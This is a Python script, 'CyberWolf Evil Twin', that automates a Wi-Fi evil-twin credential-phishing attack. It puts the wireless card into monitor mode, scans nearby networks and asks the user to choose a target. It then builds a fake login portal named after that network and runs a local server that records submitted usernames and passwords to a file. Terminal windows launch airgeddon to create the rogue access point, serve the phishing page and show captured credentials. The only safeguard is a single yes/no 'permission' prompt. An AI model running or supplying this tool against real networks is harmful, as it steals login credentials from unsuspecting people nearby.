#!/usr/bin/env python3
"""
CyberWolf Evil Twin - Auto-opening terminals with xterm
"""

import subprocess
import os
import time
import threading
from datetime import datetime

class AutoTerminalEvilTwin:
    def __init__(self):
        self.target = None
        self.captured_creds = []
        
    def banner(self):
        print("""
╔══════════════════════════════════════════════════════════════════╗
║      🐺 CYBERWOLF EVIL TWIN - AUTO TERMINAL VERSION 🐺          ║
╚══════════════════════════════════════════════════════════════════╝
        """)
    
    def check_permission(self):
        print("\n[!] LEGAL REQUIREMENT")
        answer = input("Do you have written permission to test? (yes/no): ")
        if answer.lower() not in ['yes', 'y']:
            print("\n[!] Authorization required. Exiting.")
            return False
        return True
    
    def start_monitor_mode(self):
        print("\n[*] Starting monitor mode...")
        subprocess.run(["sudo", "airmon-ng", "check", "kill"], capture_output=True)
        result = subprocess.run(["sudo", "airmon-ng", "start", "wlan0"], capture_output=True)
        if result.returncode == 0:
            print("[+] Monitor mode active on wlan0mon")
            return True
        else:
            print("[-] Failed to start monitor mode")
            return False
    
    def scan_networks(self):
        print("\n[*] Scanning for networks (15 seconds)...")
        
        scan_process = subprocess.Popen(
            ["sudo", "airodump-ng", "wlan0mon", "--write", "/tmp/scan", "--output-format", "csv"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        
        for i in range(15):
            print(f"\r[*] Scanning... {15-i} seconds remaining", end="")
            time.sleep(1)
        
        scan_process.terminate()
        time.sleep(2)
        print("\n[+] Scan complete!")
        
        networks = []
        try:
            with open("/tmp/scan-01.csv", "r") as f:
                lines = f.readlines()
            
            for line in lines:
                if "WPA" in line or "WEP" in line or "OPEN" in line:
                    parts = line.split(',')
                    if len(parts) >= 14:
                        bssid = parts[0].strip()
                        channel = parts[3].strip()
                        essid = parts[13].strip() if len(parts) > 13 else "Hidden"
                        if bssid and bssid != "BSSID" and essid and essid != "":
                            networks.append({
                                'bssid': bssid,
                                'channel': channel,
                                'essid': essid
                            })
        except:
            pass
        
        if networks:
            print("\n[+] Available Networks:")
            print("-" * 60)
            for i, net in enumerate(networks[:10]):
                print(f"  {i+1}. {net['essid']} (Channel {net['channel']})")
            print("-" * 60)
        else:
            print("\n[-] No networks found.")
        
        return networks
    
    def generate_phishing_page(self, ssid):
        os.makedirs("portals", exist_ok=True)
        
        html = f'''<!DOCTYPE html>
<html>
<head><title>{ssid} Portal</title>
<style>
body{{background:#1a1a2e;font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;}}
.container{{background:white;padding:40px;border-radius:10px;width:350px;}}
input{{width:100%;padding:10px;margin:10px 0;}}
button{{width:100%;padding:10px;background:#00ff88;border:none;cursor:pointer;}}
</style>
</head>
<body>
<div class="container">
<h2>{ssid} Login</h2>
<form action="http://localhost:8080/capture" method="POST">
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Login</button>
</form>
</div>
</body>
</html>'''
        
        filename = f"portals/{ssid.replace(' ', '_')}.html"
        with open(filename, 'w') as f:
            f.write(html)
        print(f"[+] Phishing page created: {filename}")
        return filename
    
    def start_credential_server(self):
        from http.server import HTTPServer, BaseHTTPRequestHandler
        
        class Handler(BaseHTTPRequestHandler):
            def do_POST(self):
                length = int(self.headers['Content-Length'])
                data = self.rfile.read(length).decode()
                print(f"\n[!] CREDENTIALS CAPTURED: {data}")
                with open('captured.txt', 'a') as f:
                    f.write(f"{datetime.now()}: {data}\n")
                self.send_response(200)
                self.end_headers()
            
            def log_message(self, format, *args):
                pass
        
        server = HTTPServer(('0.0.0.0', 8080), Handler)
        print("[*] Credential server running on port 8080")
        server.serve_forever()
    
    def open_terminals(self, target_ssid):
        """Open terminals automatically using xterm"""
        
        home = os.path.expanduser("~")
        portal_dir = f"{home}/cyberwolf-evil-twin/portals"
        
        # Terminal 1 - Airgeddon with instructions
        term1_script = f'''#!/bin/bash
echo "════════════════════════════════════════════════════════════"
echo "🐺 TERMINAL 1 - CREATE EVIL TWIN AP"
echo "════════════════════════════════════════════════════════════"
echo ""
echo "Target: {target_ssid}"
echo ""
echo "In Airgeddon, follow these steps:"
echo "1. Select interface: wlan0mon"
echo "2. Choose 'Evil Twin Attacks'"
echo "3. Select target: {target_ssid}"
echo ""
echo "Launching Airgeddon..."
sleep 3
sudo airgeddon
'''
        
        # Terminal 2 - Phishing server
        term2_script = f'''#!/bin/bash
echo "════════════════════════════════════════════════════════════"
echo "🐺 TERMINAL 2 - PHISHING SERVER"
echo "════════════════════════════════════════════════════════════"
echo ""
echo "Serving phishing page for: {target_ssid}"
echo "Port: 80"
echo ""
cd {portal_dir}
sudo python3 -m http.server 80
'''
        
        # Terminal 3 - Credential monitor
        term3_script = f'''#!/bin/bash
echo "════════════════════════════════════════════════════════════"
echo "🐺 TERMINAL 3 - CREDENTIAL MONITOR"
echo "════════════════════════════════════════════════════════════"
echo ""
echo "Watching for captured credentials..."
echo ""
cd {home}/cyberwolf-evil-twin
while true; do
    clear
    echo "════════════════════════════════════════════════════════════"
    echo "🐺 CAPTURED CREDENTIALS"
    echo "════════════════════════════════════════════════════════════"
    echo ""
    if [ -f captured.txt ]; then
        tail -20 captured.txt
    else
        echo "Waiting for victims to connect..."
    fi
    echo ""
    echo "────────────────────────────────────────────────────────────"
    sleep 3
done
'''
        
        # Save scripts
        scripts = [
            ("/tmp/term1.sh", term1_script),
            ("/tmp/term2.sh", term2_script),
            ("/tmp/term3.sh", term3_script)
        ]
        
        for path, content in scripts:
            with open(path, 'w') as f:
                f.write(content)
            os.chmod(path, 0o755)
        
        # Open terminals with xterm
        print("\n[*] Opening terminals...")
        
        # Use xterm (which you have)
        subprocess.Popen(["xterm", "-title", "🐺 Evil Twin AP", "-e", "/bin/bash", "/tmp/term1.sh"])
        time.sleep(1)
        subprocess.Popen(["xterm", "-title", "🐺 Phishing Server", "-e", "/bin/bash", "/tmp/term2.sh"])
        time.sleep(1)
        subprocess.Popen(["xterm", "-title", "🐺 Credential Monitor", "-e", "/bin/bash", "/tmp/term3.sh"])
        
        print("[+] 3 terminals opened automatically!")
    
    def run(self):
        self.banner()
        
        if not self.check_permission():
            return
        
        if not self.start_monitor_mode():
            return
        
        networks = self.scan_networks()
        
        if not networks:
            return
        
        try:
            choice = int(input("\n[?] Select target number: ")) - 1
            self.target = networks[choice]
        except:
            print("[-] Invalid selection")
            return
        
        print(f"\n[+] Target selected: {self.target['essid']}")
        
        # Generate phishing page
        self.generate_phishing_page(self.target['essid'])
        
        # Start credential server in background
        server_thread = threading.Thread(target=self.start_credential_server, daemon=True)
        server_thread.start()
        
        # Open terminals automatically
        self.open_terminals(self.target['essid'])
        
        print(f"""

╔══════════════════════════════════════════════════════════════════╗
║                    🐺 ATTACK IN PROGRESS 🐺                      ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                  ║
║  Target: {self.target['essid']}
║  Channel: {self.target['channel']}
║                                                                  ║
║  3 terminals have been opened:                                   ║
║  📟 Terminal 1 - Evil Twin AP (Airgeddon)                        ║
║  📟 Terminal 2 - Phishing Server (Port 80)                       ║
║  📟 Terminal 3 - Credential Monitor                              ║
║                                                                  ║
║  Watch Terminal 3 for captured credentials!                      ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝
""")
        
        input("\n[!] Press Enter to stop attack and cleanup...")
        
        # Cleanup
        print("\n[*] Cleaning up...")
        subprocess.run(["sudo", "airmon-ng", "stop", "wlan0mon"], capture_output=True)
        subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], capture_output=True)
        
        # Show captured credentials
        if os.path.exists('captured.txt'):
            print("\n📋 CAPTURED CREDENTIALS:")
            os.system('cat captured.txt')
        
        print("\n[+] Done!")

if __name__ == "__main__":
    try:
        app = AutoTerminalEvilTwin()
        app.run()
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted")
        subprocess.run(["sudo", "airmon-ng", "stop", "wlan0mon"], capture_output=True)
